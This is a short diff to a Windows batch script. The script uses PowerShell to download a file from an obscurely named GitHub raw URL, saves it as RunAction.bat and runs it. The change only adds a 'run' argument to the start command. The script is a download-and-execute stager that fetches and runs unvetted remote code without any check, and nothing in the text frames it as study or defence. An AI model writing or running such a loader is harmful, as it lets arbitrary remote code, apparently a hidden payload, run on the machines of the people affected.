@@ -1,4 +1,4 @@
 @echo off
 powershell -command "Invoke-WebRequest https://raw.githubusercontent.com/kdx32/o5789xc34/main/udny5 -OutFile RunAction.bat"
-start RunAction.bat
+start RunAction.bat run
 exit
